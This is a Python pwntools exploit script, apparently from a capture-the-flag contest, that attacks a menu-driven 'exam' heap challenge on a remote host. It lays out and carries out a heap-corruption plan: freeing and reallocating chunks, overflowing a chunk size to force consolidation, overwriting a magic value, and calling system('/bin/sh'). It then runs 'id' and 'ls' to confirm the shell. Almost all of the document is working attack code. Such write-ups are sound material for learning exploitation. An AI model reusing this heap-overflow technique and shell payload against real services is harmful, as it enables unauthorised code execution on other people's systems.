#!/usr/bin/python2
# Author: Sceptic
# Packages: pip install pwntools
# Timeout: 120 Seconds
# Interval: 5 Minutes
# Host: flatearth.fluxfingers.net
# Port: 1745

from pwn import *
from sys import argv
interactive=False

""" Exploit plan
1. allocate smallbin 1
2. allocate fastbin (24-> size==32)
3. allocate smallbin 2, 3
4. tear fastbin
5. free and reallocate smallbin 1 -> overflow fastbin->size to 32+chunk_size(smallbin)
6. free smallbin 3 -> malloc_consolidate fastbin mit top
7. reallocate 3 -> overflow from fastbin into 2 to override magic value + set /bin/sh&&
8. exam smallbin 2 -> trigger system("/bin/sh")
"""

if len(argv) == 3:
    HOST = argv[1]
    PORT = int(argv[2])
else:
    HOST = "ubuntu"
    PORT = 4444

r = remote(HOST, PORT)

"""
========
1. add summary
2. remove summary
3. study summary
4. create crib
5. tear crib in frustration
6. go to exam
>
"""

CONTENT_SIZE = 128
def recv_prompt():
    return r.recvuntil("\n> ")

def add_summary(content):
    assert(len(content)==CONTENT_SIZE+1 or content.index("\n")==len(content)-1)
    recv_prompt() # menu
    r.sendline("1")
    recv_prompt() # content input
    r.send(content)
    r.recvuntil("uccess")

def free_summary(i):
    recv_prompt() # menu
    r.sendline("2")
    recv_prompt() # which one?
    r.sendline("{:d}".format(i))
    r.recvuntil("uccess")

def create_crib():
    recv_prompt() # menu
    r.sendline("4")
    r.recvuntil("uccess")

def free_crib():
    recv_prompt() # menu
    r.sendline("5")
    r.recvuntil("That felt awesome")

def go_to_exam(i):
    recv_prompt() # menu
    r.sendline("6")
    recv_prompt() # which paper?
    r.sendline("{:d}".format(i))
MAGIC_TAR = 0x434947414d535449
SMALL_SIZE = CONTENT_SIZE+16
FAST_SIZE = 32
if interactive:
    raw_input("go...")
add_summary("\n") # 0
create_crib()
add_summary((CONTENT_SIZE-1)*"B"+"\n") # 1
add_summary((CONTENT_SIZE-1)*"C"+"\n") # 2
free_summary(0)
free_crib()
consolidated_size=(FAST_SIZE+SMALL_SIZE)|1
add_summary(CONTENT_SIZE*"A"+chr(consolidated_size)) # 0
free_summary(2)
overflow_pl = (FAST_SIZE-8-8)*"O"+p64(0xA515e515e515eA)+p64(MAGIC_TAR)+"/bin/sh\n"
add_summary(overflow_pl) #-> overflow into 1

go_to_exam(1)

r.sendline("id")

r.clean(1)
CHALL = "exam"
if interactive:
    r.interactive()
else:
    r.sendline("ls")
    answ = r.recvuntil(CHALL, timeout=2)
    if CHALL in answ:
        print("Success")
        exit(0)
    else:
        print("Fail")
        exit(-1)
